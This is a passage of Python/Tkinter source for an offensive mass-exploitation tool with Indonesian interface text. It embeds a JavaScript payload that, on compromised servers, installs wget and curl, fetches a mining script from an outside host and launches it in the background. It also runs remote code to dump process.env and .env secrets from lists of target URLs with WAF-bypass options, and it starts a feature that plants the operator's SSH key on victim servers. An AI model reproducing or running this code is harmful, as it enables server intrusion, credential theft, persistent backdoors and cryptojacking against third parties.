        var hasWget = checkCommand('wget');
        output.push("wget: " + (hasWget ? "OK" : "NOT FOUND"));
        
        if (!hasWget) {{
            output.push("wget NOT FOUND - Installing wget using " + pm + "...");
            var wgetInstalled = false;
            
            if (installPackage('wget', pm)) {{
                // Wait and verify
                try {{
                    cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                }} catch (e) {{
                    // Ignore
                }}
                hasWget = checkCommand('wget');
                if (hasWget) {{
                    output.push("✓ wget installed successfully");
                    wgetInstalled = true;
                }} else {{
                    // Try alternative installation
                    output.push("Verification failed, trying alternative installation...");
                    try {{
                        var directCmd = '';
                        switch(pm) {{
                            case 'apt-get':
                                directCmd = 'DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y wget';
                                break;
                            case 'apk':
                                directCmd = 'apk add --no-cache wget';
                                break;
                            case 'yum':
                                directCmd = 'yum install -y wget';
                                break;
                            case 'dnf':
                                directCmd = 'dnf install -y wget';
                                break;
                            case 'pacman':
                                directCmd = 'pacman -S --noconfirm wget';
                                break;
                            case 'zypper':
                                directCmd = 'zypper install -y wget';
                                break;
                        }}
                        if (directCmd) {{
                            cp.execSync(directCmd + ' 2>&1', {{timeout: 120000, encoding: 'utf8'}});
                            cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                            hasWget = checkCommand('wget');
                            if (hasWget) {{
                                output.push("✓ wget installed successfully (alternative method)");
                                wgetInstalled = true;
                            }}
                        }}
                    }} catch (e) {{
                        output.push("Alternative installation failed");
                    }}
                }}
            }}
            
            if (!wgetInstalled) {{
                return "ERROR: Failed to install wget. Cannot download mining script without wget.";
            }}
        }}
        
        // Check curl (REQUIRED for mining script)
        var hasCurl = checkCommand('curl');
        output.push("curl: " + (hasCurl ? "OK" : "NOT FOUND"));
        
        if (!hasCurl) {{
            output.push("curl NOT FOUND - Installing curl using " + pm + "...");
            var curlInstalled = false;
            
            if (installPackage('curl', pm)) {{
                // Wait a bit and verify
                output.push("Waiting for curl to be available...");
                try {{
                    cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                }} catch (e) {{
                    // Ignore
                }}
                output.push("Verifying curl installation...");
                hasCurl = checkCommand('curl');
                if (hasCurl) {{
                    output.push("✓ curl installed successfully");
                    curlInstalled = true;
                }} else {{
                    // Try alternative installation
                    output.push("Verification failed, trying alternative installation...");
                    try {{
                        var directCmd = '';
                        switch(pm) {{
                            case 'apt-get':
                                directCmd = 'DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y curl';
                                break;
                            case 'apk':
                                directCmd = 'apk add --no-cache curl';
                                break;
                            case 'yum':
                                directCmd = 'yum install -y curl';
                                break;
                            case 'dnf':
                                directCmd = 'dnf install -y curl';
                                break;
                            case 'pacman':
                                directCmd = 'pacman -S --noconfirm curl';
                                break;
                            case 'zypper':
                                directCmd = 'zypper install -y curl';
                                break;
                        }}
                        if (directCmd) {{
                            cp.execSync(directCmd + ' 2>&1', {{timeout: 120000, encoding: 'utf8'}});
                            cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                            hasCurl = checkCommand('curl');
                            if (hasCurl) {{
                                output.push("✓ curl installed successfully (alternative method)");
                                curlInstalled = true;
                            }}
                        }}
                    }} catch (e) {{
                        output.push("Alternative installation failed");
                    }}
                }}
            }} else {{
                // Try direct installation
                output.push("Installation returned false, trying direct installation...");
                try {{
                    var directCmd = '';
                    switch(pm) {{
                        case 'apt-get':
                            directCmd = 'DEBIAN_FRONTEND=noninteractive apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y curl';
                            break;
                        case 'apk':
                            directCmd = 'apk add --no-cache curl';
                            break;
                        case 'yum':
                            directCmd = 'yum install -y curl';
                            break;
                        case 'dnf':
                            directCmd = 'dnf install -y curl';
                            break;
                        case 'pacman':
                            directCmd = 'pacman -S --noconfirm curl';
                            break;
                        case 'zypper':
                            directCmd = 'zypper install -y curl';
                            break;
                    }}
                    if (directCmd) {{
                        cp.execSync(directCmd + ' 2>&1', {{timeout: 120000, encoding: 'utf8'}});
                        cp.execSync('sleep 2', {{timeout: 3000, stdio: 'ignore'}});
                        hasCurl = checkCommand('curl');
                        if (hasCurl) {{
                            output.push("✓ curl installed successfully (direct method)");
                            curlInstalled = true;
                        }}
                    }}
                }} catch (e) {{
                    output.push("Direct installation also failed");
                }}
            }}
            
            if (!curlInstalled) {{
                return "ERROR: Failed to install curl. Mining script requires curl to work correctly. Cannot proceed.";
            }}
        }}
        
        // Final verification - ALL requirements must be met before proceeding
        output.push("");
        output.push("=== Final Verification ===");
        
        // Verify bash or sh
        var canUseBash = hasBash || checkBash();
        var canUseSh = useShInstead;
        
        if (!canUseBash && !canUseSh) {{
            // Final check for sh
            try {{
                cp.execSync('test -f /bin/sh && test -x /bin/sh', {{timeout: 2000, stdio: 'ignore'}});
                canUseSh = true;
                output.push("Using /bin/sh as fallback");
            }} catch (e) {{
                return "ERROR: Neither bash nor sh is available. Cannot execute mining script.";
            }}
        }}
        
        // Verify wget
        var finalWget = checkCommand('wget');
        if (!finalWget) {{
            return "ERROR: wget is not available after installation. Cannot download mining script.";
        }}
        output.push("wget: VERIFIED");
        
        // Verify curl
        var finalCurl = checkCommand('curl');
        if (!finalCurl) {{
            return "ERROR: curl is not available after installation. Mining script requires curl to work correctly.";
        }}
        output.push("curl: VERIFIED");
        
        // Verify bash or sh
        if (canUseBash) {{
            output.push("bash: VERIFIED");
        }} else if (canUseSh) {{
            output.push("sh: VERIFIED (using as fallback)");
        }} else {{
            return "ERROR: No shell (bash/sh) available. Cannot execute mining script.";
        }}
        
        output.push("All requirements verified successfully!");
        
        // Final check before proceeding - ALL must be available
        if (!finalWget) {{
            return output.join("\\n") + "\\n\\nERROR: wget verification failed. Cannot proceed.";
        }}
        if (!finalCurl) {{
            return output.join("\\n") + "\\n\\nERROR: curl verification failed. Mining script requires curl. Cannot proceed.";
        }}
        if (!canUseBash && !canUseSh) {{
            return output.join("\\n") + "\\n\\nERROR: No shell (bash/sh) available. Cannot proceed.";
        }}
        
        output.push("");
        output.push("=== Downloading Mining Setup Script ===");
        
        // Download and execute mining script
        var scriptUrl = 'https://mytirtatarum.com/public/assets/guides/guides.txt';
        var scriptFile = 'initial.sh';
        
        try {{
            // Get current working directory for absolute path
            var currentDir = cp.execSync('pwd', {{timeout: 5000, encoding: 'utf8'}}).trim();
            var scriptPath = currentDir + '/' + scriptFile;
            
            // Download using wget (we verified it's available)
            output.push("Downloading script from: " + scriptUrl);
            output.push("Saving to: " + scriptPath);
            
            var downloadResult = '';
            var downloadSuccess = false;
            try {{
                downloadResult = cp.execSync('wget ' + scriptUrl + ' -O ' + scriptFile + ' 2>&1', {{timeout: 30000, encoding: 'utf8'}});
                output.push("Download output: " + downloadResult);
                
                // Check if download was successful (wget returns 0 on success)
                // Also check output for success indicators
                if (downloadResult.indexOf('saved') !== -1 || downloadResult.indexOf('100%') !== -1 || downloadResult.indexOf('200 OK') !== -1) {{
                    downloadSuccess = true;
                    output.push("✓ Download appears successful");
                }} else {{
                    output.push("WARNING: Download output does not show clear success");
                }}
            }} catch (e) {{
                output.push("Download error: " + e.message);
                // Continue to verify file anyway
            }}
            
            // Verify file exists after download
            var fileExists = false;
            try {{
                cp.execSync('test -f ' + scriptFile, {{timeout: 2000, stdio: 'ignore'}});
                output.push("✓ Script file verified: " + scriptFile);
                fileExists = true;
            }} catch (e) {{
                // Try with absolute path
                try {{
                    cp.execSync('test -f ' + scriptPath, {{timeout: 2000, stdio: 'ignore'}});
                    output.push("✓ Script file verified (absolute path): " + scriptPath);
                    fileExists = true;
                }} catch (e2) {{
                    // File doesn't exist - check what files are in current directory
                    try {{
                        var lsResult = cp.execSync('ls -la', {{timeout: 5000, encoding: 'utf8'}});
                        output.push("Current directory contents:\\n" + lsResult);
                    }} catch (e3) {{
                        // Ignore
                    }}
                    return output.join("\\n") + "\\n\\nERROR: Downloaded file not found. Download may have failed.\\nExpected file: " + scriptFile + "\\nAbsolute path: " + scriptPath + "\\n\\nPlease check the download URL and network connectivity.";
                }}
            }}
            
            if (!fileExists) {{
                return output.join("\\n") + "\\n\\nERROR: File verification failed. Cannot proceed.";
            }}
            
            // Check file size (should not be empty)
            try {{
                var fileSize = cp.execSync('stat -c%s ' + scriptFile + ' 2>/dev/null || wc -c < ' + scriptFile, {{timeout: 5000, encoding: 'utf8'}}).trim();
                if (parseInt(fileSize) === 0) {{
                    return output.join("\\n") + "\\n\\nERROR: Downloaded file is empty (0 bytes). Download may have failed.";
                }}
                output.push("File size: " + fileSize + " bytes");
                
                // Check if file looks like a bash script (should start with #! or have bash commands)
                try {{
                    var firstLine = cp.execSync('head -n 1 ' + scriptFile + ' 2>/dev/null', {{timeout: 3000, encoding: 'utf8'}}).trim();
                    if (firstLine.indexOf('#!/bin/bash') !== -1 || firstLine.indexOf('#!/bin/sh') !== -1 || firstLine.indexOf('#') === 0) {{
                        output.push("✓ File appears to be a valid shell script");
                    }} else {{
                        output.push("WARNING: File may not be a valid shell script. First line: " + firstLine.substring(0, 50));
                    }}
                }} catch (e) {{
                    output.push("WARNING: Could not verify script format");
                }}
            }} catch (e) {{
                output.push("WARNING: Could not check file size");
            }}
            
            // Convert Windows line endings (\\r\\n) to Unix line endings (\\n)
            // This fixes the "$'\\r': command not found" error
            output.push("Converting line endings (Windows to Unix)...");
            try {{
                // Try using dos2unix if available
                try {{
                    cp.execSync('dos2unix ' + scriptFile + ' 2>/dev/null', {{timeout: 5000, stdio: 'ignore'}});
                    output.push("✓ Converted using dos2unix");
                }} catch (e) {{
                    // Fallback: use sed to remove \\r characters
                    try {{
                        // Use sed with proper escaping - remove carriage returns
                        cp.execSync('sed -i "s/\\\\r$//" ' + scriptFile + ' 2>/dev/null || sed -i \'s/\\r$//\' ' + scriptFile + ' 2>/dev/null', {{timeout: 5000, stdio: 'ignore'}});
                        output.push("✓ Converted using sed");
                    }} catch (e2) {{
                        // Last resort: use tr or perl to delete \\r
                        try {{
                            // Try perl first (more reliable)
                            cp.execSync('perl -pi -e "s/\\r\\n?/\\n/g" ' + scriptFile + ' 2>/dev/null', {{timeout: 5000, stdio: 'ignore'}});
                            output.push("✓ Converted using perl");
                        }} catch (e3) {{
                            // Try tr as last resort
                            try {{
                                cp.execSync('tr -d "\\\\r" < ' + scriptFile + ' > ' + scriptFile + '.tmp && mv ' + scriptFile + '.tmp ' + scriptFile + ' 2>/dev/null', {{timeout: 5000, stdio: 'ignore'}});
                                output.push("✓ Converted using tr");
                            }} catch (e4) {{
                                output.push("WARNING: Could not convert line endings. Script may fail if it has Windows line endings.");
                            }}
                        }}
                    }}
                }}
            }} catch (e) {{
                output.push("WARNING: Line ending conversion failed: " + e.message);
            }}
            
            // Make executable
            cp.execSync('chmod +x ' + scriptFile, {{timeout: 5000}});
            output.push("✓ Script made executable");
            
            // Verify file is executable
            try {{
                cp.execSync('test -x ' + scriptFile, {{timeout: 2000, stdio: 'ignore'}});
                output.push("✓ Script is executable");
            }} catch (e) {{
                output.push("WARNING: Could not verify executable permission");
            }}
            
            // Final verification before execution - check both absolute and relative
            output.push("=== Final Verification Before Execution ===");
            var finalScriptPath = '';
            var finalFileCheck = false;
            
            // First try absolute path
            try {{
                cp.execSync('test -f ' + scriptPath, {{timeout: 2000, stdio: 'ignore'}});
                finalFileCheck = true;
                finalScriptPath = scriptPath;
                output.push("✓ Final check: File exists at absolute path: " + scriptPath);
            }} catch (e) {{
                // Try relative path
                try {{
                    cp.execSync('test -f ' + scriptFile, {{timeout: 2000, stdio: 'ignore'}});
                    finalFileCheck = true;
                    // Use absolute path constructed from currentDir + filename
                    finalScriptPath = currentDir + '/' + scriptFile;
                    output.push("✓ Final check: File exists at relative path: " + scriptFile);
                    output.push("Using absolute path: " + finalScriptPath);
                }} catch (e2) {{
                    // Last attempt: check what files are actually in current directory
                    try {{
                        var lsResult = cp.execSync('ls -la | grep -E "(initial|' + scriptFile + ')"', {{timeout: 5000, encoding: 'utf8'}});
                        output.push("Files found in directory:\\n" + lsResult);
                    }} catch (e3) {{
                        // Ignore
                    }}
                    return output.join("\\n") + "\\n\\nERROR: File not found before execution.\\nExpected absolute: " + scriptPath + "\\nExpected relative: " + scriptFile + "\\nCurrent dir: " + currentDir + "\\n\\nDownload may have failed or file was removed.";
                }}
            }}
            
            if (!finalFileCheck || !finalScriptPath) {{
                return output.join("\\n") + "\\n\\nERROR: Final file verification failed. Cannot execute script.";
            }}
            
            // Verify the final path one more time
            try {{
                cp.execSync('test -f ' + finalScriptPath, {{timeout: 2000, stdio: 'ignore'}});
                output.push("✓ Verified final script path: " + finalScriptPath);
                
                // Also verify file is readable
                cp.execSync('test -r ' + finalScriptPath, {{timeout: 2000, stdio: 'ignore'}});
                output.push("✓ File is readable");
                
                // Verify file is executable
                cp.execSync('test -x ' + finalScriptPath, {{timeout: 2000, stdio: 'ignore'}});
                output.push("✓ File is executable");
                
                // Test if we can actually read the first line (verify it's a real file)
                try {{
                    var firstLine = cp.execSync('head -n 1 ' + finalScriptPath + ' 2>/dev/null', {{timeout: 3000, encoding: 'utf8', cwd: currentDir}}).trim();
                    output.push("✓ File first line: " + firstLine.substring(0, 50));
                }} catch (e) {{
                    output.push("WARNING: Could not read first line of file");
                }}
            }} catch (e) {{
                return output.join("\\n") + "\\n\\nERROR: Final script path verification failed: " + finalScriptPath + "\\nError: " + e.message;
            }}
            
            // Execute in background using verified absolute path
            // Determine which shell to use
            var shellCmd = '';
            if (canUseBash) {{
                shellCmd = 'bash';
            }} else if (canUseSh) {{
                shellCmd = 'sh';
            }} else {{
                return "ERROR: No shell available to execute script";
            }}
            
            // Build execution command with explicit working directory and absolute path
            var logFile = currentDir + '/initial_setup.log';
            
            // Use simple but reliable approach: cd to directory and execute with absolute path
            // The key is to use absolute path for the script and ensure we're in the right directory
            var execCmd = 'cd "' + currentDir + '" && ' + shellCmd + ' "' + finalScriptPath + '" ' + wallet + ' ' + email + ' > "' + logFile + '" 2>&1 &';
            
            if (canUseBash) {{
                if (bashWasMissing) {{
                    output.push("Using 'bash " + finalScriptPath + "' (bash was newly installed)");
                }} else {{
                    output.push("Using 'bash " + finalScriptPath + "' (bash already available)");
                }}
            }} else {{
                output.push("Using 'sh " + finalScriptPath + "' (bash not available, using sh)");
            }}
            
            output.push("Working directory: " + currentDir);
            output.push("Script path (absolute): " + finalScriptPath);
            output.push("Log file: " + logFile);
            output.push("Execution command: " + execCmd);
            
            // Verify one last time that file exists and is accessible from current directory
            try {{
                // Test if we can actually access the file from the current directory
                var testCmd = 'cd "' + currentDir + '" && test -f "' + finalScriptPath + '" && echo "OK"';
                var testResult = cp.execSync(testCmd, {{timeout: 3000, encoding: 'utf8'}}).trim();
                if (testResult === 'OK') {{
                    output.push("✓ Final verification: File accessible from working directory");
                }} else {{
                    output.push("WARNING: File verification returned: " + testResult);
                }}
            }} catch (e) {{
                output.push("WARNING: Could not verify file accessibility: " + e.message);
            }}
            
            try {{
                // Execute with explicit cwd option to ensure working directory
                var proc = cp.exec(execCmd, {{cwd: currentDir}}, function(error, stdout, stderr) {{
                    // Background process, no need to wait
                    if (error) {{
                        // Error will be logged to initial_setup.log
                    }}
                }});
                
                // Unref the process so it can run independently
                if (proc && proc.unref) {{
                    proc.unref();
                }}
                
                output.push("✓ Process started in background");
            }} catch (e) {{
                return output.join("\\n") + "\\n\\nERROR: Failed to execute script: " + e.message;
            }}
            
            // Wait a moment to verify process started
            try {{
                cp.execSync('sleep 1', {{timeout: 2000, stdio: 'ignore'}});
            }} catch (e) {{
                // Ignore
            }}
            
            output.push("✓ Mining setup script started in background");
            output.push("Check initial_setup.log for progress");
            output.push("Script location: " + scriptPath);
            output.push("");
            output.push("Setup completed! Mining should start shortly.");
            
        }} catch (e) {{
            return output.join("\\n") + "\\n\\nERROR during execution: " + e.message + "\\nStack: " + (e.stack || 'N/A');
        }}
        
        return output.join("\\n");
        
    }} catch (e) {{
        return "Failed: " + e.message;
    }}
}})();"""
    
    def _browse_save_directory(self):
        """Browse for save directory."""
        directory = filedialog.askdirectory(title="Pilih folder untuk menyimpan hasil dump")
        if directory:
            self.env_save_dir_var.set(directory)
    
    def _start_env_dump(self):
        """Start environment variable dumping."""
        if self.env_running:
            messagebox.showwarning("Warning", "Env dump sedang berjalan", parent=self.root)
            return
        
        targets_text = self.env_targets_text.get('1.0', tk.END).strip()
        if not targets_text:
            messagebox.showerror("Error", "Masukkan list target", parent=self.root)
            return
        
        save_dir = self.env_save_dir_var.get().strip()
        if not save_dir:
            messagebox.showerror("Error", "Pilih folder untuk menyimpan hasil", parent=self.root)
            return
        
        try:
            threads = int(self.env_threads_var.get())
            if threads < 1:
                raise ValueError("Threads harus lebih besar dari 0")
        except ValueError:
            messagebox.showerror("Error", "Threads tidak valid", parent=self.root)
            return
        
        try:
            timeout = int(self.env_timeout_var.get())
            if timeout < 1:
                raise ValueError("Timeout harus lebih besar dari 0")
        except ValueError:
            messagebox.showerror("Error", "Timeout tidak valid", parent=self.root)
            return
        
        # Parse targets
        targets = self._parse_mine_targets(targets_text)
        if not targets:
            messagebox.showerror("Error", "Tidak ada target yang valid ditemukan", parent=self.root)
            return
        
        # Set state
        self.env_running = True
        self.env_stop_flag = False
        self.env_results = {}
        self.env_start_btn.config(state=tk.DISABLED)
        self.env_stop_btn.config(state=tk.NORMAL)
        
        # Clear log
        self.env_log_output.delete('1.0', tk.END)
        self.env_log_output.insert('1.0', f"Starting env dump for {len(targets)} targets...\n", "info")
        self.env_log_output.insert(tk.END, f"Threads: {threads}, Timeout: {timeout}s\n", "info")
        self.env_log_output.insert(tk.END, f"Save directory: {save_dir}\n", "info")
        self.env_log_output.insert(tk.END, "=" * 60 + "\n\n")
        
        # Start dumping process
        threading.Thread(target=self._dump_env_targets, args=(targets, threads, timeout, save_dir), daemon=True).start()
    
    def _stop_env_dump(self):
        """Stop environment variable dumping."""
        self.env_stop_flag = True
        self.env_progress_var.set("Stopping...")
        if self.env_executor:
            # Cancel all pending futures
            for future in self.env_futures:
                future.cancel()
            # Shutdown executor
            self.env_executor.shutdown(wait=False)
    
    def _dump_env_targets(self, targets: List[str], threads: int, timeout: int, save_dir: str):
        """Dump environment variables from multiple targets using threads."""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        
        total = len(targets)
        completed = 0
        
        try:
            self.env_executor = ThreadPoolExecutor(max_workers=threads)
            self.env_futures = []
            
            # Submit all tasks
            for target_url in targets:
                if self.env_stop_flag:
                    break
                future = self.env_executor.submit(self._dump_env_single_target, target_url, timeout)
                self.env_futures.append(future)
            
            # Process results as they complete
            for future in as_completed(self.env_futures):
                if self.env_stop_flag:
                    break
                completed += 1
                self.root.after(0, lambda c=completed, t=total: 
                              self.env_progress_var.set(f"Progress: {c}/{t}"))
            
            # Save results
            if not self.env_stop_flag or completed > 0:
                self.root.after(0, lambda: self.env_log_output.insert(tk.END, "\n" + "=" * 60 + "\n", "info"))
                self.root.after(0, lambda: self.env_log_output.insert(tk.END, "Saving results...\n", "info"))
                filename = self._save_env_results(save_dir)
                if filename:
                    self.root.after(0, lambda f=filename: 
                                  self.env_log_output.insert(tk.END, f"Results saved to: {f}\n", "success"))
            
        except Exception as e:
            self.root.after(0, lambda msg=str(e): 
                          self.env_log_output.insert(tk.END, f"ERROR: {msg}\n", "error"))
        finally:
            # Reset state
            self.env_running = False
            self.env_stop_flag = False
            self.root.after(0, lambda: self.env_start_btn.config(state=tk.NORMAL))
            self.root.after(0, lambda: self.env_stop_btn.config(state=tk.DISABLED))
            self.root.after(0, lambda: self.env_progress_var.set("Ready"))
            if self.env_executor:
                self.env_executor.shutdown(wait=True)
    
    def _dump_env_single_target(self, target_url: str, timeout: int):
        """Dump environment variables from a single target."""
        try:
            # Create exploit instance with timeout
            env_exploit = CVEExploit(timeout=timeout, verify_ssl=False)
            env_exploit.update_proxy(
                self.proxy_check_var.get(),
                self.proxy_entry.get()
            )
            
            # Disable retries
            for prefix in ('http://', 'https://'):
                if prefix in env_exploit.session.adapters:
                    adapter = env_exploit.session.adapters[prefix]
                    from urllib3.util.retry import Retry
                    adapter.max_retries = Retry(total=0, connect=0, read=0, redirect=0, status=0, other=0, backoff_factor=0)
            
            output_parts = []
            
            # 1. Get process.env using JavaScript
            env_code = """(function(){
    try {
        var env = process.env;
        var result = [];
        for (var key in env) {
            if (env.hasOwnProperty(key)) {
                result.push(key + '=' + env[key]);
            }
        }
        return result.length > 0 ? result.join('\\n') : '';
    } catch (e) {
        return 'ERROR: ' + e.message;
    }
})()"""
            
            try:
                process_env = env_exploit.execute_js_raw(
                    target_url,
                    self.endpoint_entry.get(),
                    env_code,
                    self.unicode_waf_var.get(),
                    self.utf16_waf_var.get(),
                    self.aes_var.get(),
                    self.payload_type_var.get()
                )
                if process_env and process_env.strip() and not process_env.startswith("ERROR:"):
                    output_parts.append("=== process.env ===")
                    output_parts.append(process_env.strip())
            except Exception as e:
                # Skip if process.env fails
                pass
            
            # 2. Read .env files using command execution (more reliable)
            env_files = ['.env', '.env.local', '.env.production', '.env.development']
            
            for env_file in env_files:
                try:
                    # Use command execution like in "Eksekusi Perintah" tab
                    env_content = env_exploit.execute_command_auto(
                        target_url,
                        self.endpoint_entry.get(),
                        f"cat {env_file} 2>/dev/null || test -f {env_file} && cat {env_file} || echo ''",
                        self.unicode_waf_var.get(),
                        self.utf16_waf_var.get(),
                        self.aes_var.get(),
                        False,  # Not async
                        self.payload_type_var.get()
                    )
                    
                    if env_content and env_content.strip() and not env_content.startswith("ERROR:"):
                        # Check if it's actual content (not just error message)
                        if len(env_content.strip()) > 10:  # Reasonable content length
                            output_parts.append(f"\n=== {env_file} ===")
                            output_parts.append(env_content.strip())
                except Exception as e:
                    # Skip this file if error
                    continue
            
            # Combine all results
            if output_parts:
                res = "\n".join(output_parts)
            else:
                res = ""
            
            # Store result
            with self.env_results_lock:
                if res and res.strip() and not res.startswith("ERROR:"):
                    self.env_results[target_url] = res
                    # Log: ada (green)
                    self.root.after(0, lambda t=target_url: 
                                  self.env_log_output.insert(tk.END, f"[ADA] {t}\n", "success"))
                elif res and res.strip() and res.startswith("ERROR:"):
                    self.env_results[target_url] = None
                    # Log: error (red)
                    self.root.after(0, lambda t=target_url, r=res: 
                                  self.env_log_output.insert(tk.END, f"[ERROR] {t}: {r}\n", "error"))
                else:
                    self.env_results[target_url] = None
                    # Log: tidak ada (blue)
                    self.root.after(0, lambda t=target_url: 
                                  self.env_log_output.insert(tk.END, f"[TIDAK ADA] {t}\n", "info"))
            
            self.root.after(0, lambda: self.env_log_output.see(tk.END))
            
        except Exception as e:
            error_msg = str(e)
            with self.env_results_lock:
                self.env_results[target_url] = None
            # Log: error (red)
            self.root.after(0, lambda t=target_url, msg=error_msg: 
                          self.env_log_output.insert(tk.END, f"[ERROR] {t}: {msg}\n", "error"))
            self.root.after(0, lambda: self.env_log_output.see(tk.END))
    
    def _save_env_results(self, save_dir: str):
        """Save environment dump results to file."""
        import datetime
        
        try:
            # Create directory if not exists
            os.makedirs(save_dir, exist_ok=True)
            
            # Generate filename with timestamp
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(save_dir, f"env_dump_{timestamp}.txt")
            
            # Write results
            with open(filename, 'w', encoding='utf-8') as f:
                for target_url, env_data in self.env_results.items():
                    f.write(f"{target_url}\n")
                    f.write("-" * 80 + "\n")
                    if env_data:
                        f.write(f"{env_data}\n")
                    else:
                        f.write("(No environment data available)\n")
                    f.write("\n")
            
            return filename
        except Exception as e:
            self.root.after(0, lambda msg=str(e): 
                          self.env_log_output.insert(tk.END, f"ERROR saving file: {msg}\n", "error"))
            return None
    
    def _create_auto_ssh_tab(self, parent):
        """Create Auto Add SSH tab."""
        # Instructions
        info_frame = ttk.LabelFrame(parent, text="Instruksi", padding=5)
        info_frame.pack(fill=tk.X, pady=2)
        
        info_text = "Otomatis tambahkan SSH public key ke server. Akan skip jika server di dalam container."
        ttk.Label(info_frame, text=info_text, font=('TkDefaultFont', 9), 
                 foreground='gray', wraplength=600).pack(anchor=tk.W)
        
        # Configuration frame
        config_frame = ttk.LabelFrame(parent, text="Konfigurasi", padding=5)
        config_frame.pack(fill=tk.X, pady=5)
        
        # SSH Public Key input
        key_frame = ttk.Frame(config_frame)
        key_frame.pack(fill=tk.X, pady=2)
        ttk.Label(key_frame, text="SSH Public Key:").pack(side=tk.LEFT, padx=5)
        self.ssh_key_text = scrolledtext.ScrolledText(key_frame, height=4, wrap=tk.WORD,
                                                     font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9))
        self.ssh_key_text.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        auto_key_btn = ttk.Button(key_frame, text="Auto Get Key", command=self._auto_get_ssh_key)
        auto_key_btn.pack(side=tk.LEFT, padx=5)
        
        # Threads and Timeout
        settings_frame = ttk.Frame(config_frame)
        settings_frame.pack(fill=tk.X, pady=2)
        ttk.Label(settings_frame, text="Threads:").pack(side=tk.LEFT, padx=5)
        self.ssh_threads_var = tk.StringVar(value="10")
        threads_entry = ttk.Entry(settings_frame, textvariable=self.ssh_threads_var, width=10)
        threads_entry.pack(side=tk.LEFT, padx=5)
        
        ttk.Label(settings_frame, text="Timeout (detik):").pack(side=tk.LEFT, padx=5)
        self.ssh_timeout_var = tk.StringVar(value="30")
        timeout_entry = ttk.Entry(settings_frame, textvariable=self.ssh_timeout_var, width=10)
        timeout_entry.pack(side=tk.LEFT, padx=5)
        
        # Target list
        target_frame = ttk.LabelFrame(parent, text="List Target", padding=5)
        target_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        ttk.Label(target_frame, text="Masukkan list target (satu per baris). URL akan otomatis di-extract dari setiap line.").pack(anchor=tk.W, pady=2)
        self.ssh_targets_text = scrolledtext.ScrolledText(target_frame, height=8, wrap=tk.WORD,
                                                           font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9))
        self.ssh_targets_text.pack(fill=tk.BOTH, expand=True, pady=2)
        
        # Buttons
        btn_frame = ttk.Frame(parent)
        btn_frame.pack(fill=tk.X, pady=5)
        self.ssh_start_btn = ttk.Button(btn_frame, text="Start Add SSH", 
                                        command=self._start_auto_ssh)
        self.ssh_start_btn.pack(side=tk.LEFT, padx=5)
        self.ssh_stop_btn = ttk.Button(btn_frame, text="Stop", 
                                       command=self._stop_auto_ssh, state=tk.DISABLED)
        self.ssh_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Copy format selection
        ttk.Label(btn_frame, text="Copy Format:").pack(side=tk.LEFT, padx=(10, 5))
        self.ssh_copy_format_var = tk.StringVar(value="Default")
        copy_format_combo = ttk.Combobox(btn_frame, textvariable=self.ssh_copy_format_var,
                                         values=["Default", "Koneksi SSH"],
                                         state="readonly", width=15)
        copy_format_combo.pack(side=tk.LEFT, padx=5)
        
        # Copy successful results button
        self.ssh_copy_btn = ttk.Button(btn_frame, text="Copy Valid Results", 
                                      command=self._copy_ssh_results)
        self.ssh_copy_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress
        self.ssh_progress_var = tk.StringVar(value="Ready")
        ttk.Label(parent, textvariable=self.ssh_progress_var, font=('TkDefaultFont', 9)).pack(anchor=tk.W, pady=2)
        
        # Log output
        ttk.Label(parent, text="Log:").pack(anchor=tk.W, pady=(10, 5))
        self.ssh_log_output = scrolledtext.ScrolledText(
            parent,
            wrap=tk.WORD,
            font=('Consolas', 9) if sys.platform == 'win32' else ('Monospace', 9),
            height=12
        )
        self.ssh_log_output.pack(fill=tk.BOTH, expand=True)
        
        # Configure text colors
        self.ssh_log_output.tag_config("success", foreground="#00AA00")  # Green
        self.ssh_log_output.tag_config("info", foreground="#0066CC")     # Blue
        self.ssh_log_output.tag_config("error", foreground="#CC0000")    # Red
        self.ssh_log_output.tag_config("exists", foreground="#000000")   # Black
        
        # SSH state
        self.ssh_running = False
        self.ssh_stop_flag = False
        self.ssh_results = []  # Store successful results
        self.ssh_results_lock = threading.Lock()
        self.ssh_executor = None
        self.ssh_futures = []
    
    def _auto_get_ssh_key(self):
        """Auto-detect and get SSH public key from system."""
        import platform
        import subprocess
        
        self.ssh_key_text.delete('1.0', tk.END)
        
        home_dir = os.path.expanduser("~")
        key_paths = []
        
        if platform.system() == "Windows":
            key_paths = [
                os.path.join(home_dir, ".ssh", "id_rsa.pub"),
                os.path.join(home_dir, ".ssh", "id_ed25519.pub"),
            ]
            try:
                result = subprocess.run(["wsl", "cat", "~/.ssh/id_rsa.pub"], 
                                      capture_output=True, text=True, timeout=5)
                if result.returncode == 0 and result.stdout.strip():
                    self.ssh_key_text.insert('1.0', result.stdout.strip())
                    messagebox.showinfo("Success", "SSH key loaded from WSL", parent=self.root)
                    return
            except:
                pass
        else:
            key_paths = [
                os.path.join(home_dir, ".ssh", "id_rsa.pub"),
                os.path.join(home_dir, ".ssh", "id_ed25519.pub"),
            ]
        
        for key_path in key_paths:
            if os.path.exists(key_path):
                try:
                    with open(key_path, 'r', encoding='utf-8') as f:
                        key_content = f.read().strip()
                        if key_content:
                            self.ssh_key_text.insert('1.0', key_content)
                            messagebox.showinfo("Success", f"SSH key loaded from:\n{key_path}", parent=self.root)
                            return
                except:
                    continue
        
        messagebox.showwarning("Warning", 
                             "Could not auto-detect SSH public key.\nPlease enter it manually.", 
                             parent=self.root)
    
    def _start_auto_ssh(self):
        """Start auto adding SSH keys."""
        if self.ssh_running:
            messagebox.showwarning("Warning", "SSH add sedang berjalan", parent=self.root)
            return
        
        ssh_key = self.ssh_key_text.get('1.0', tk.END).strip()
        if not ssh_key:
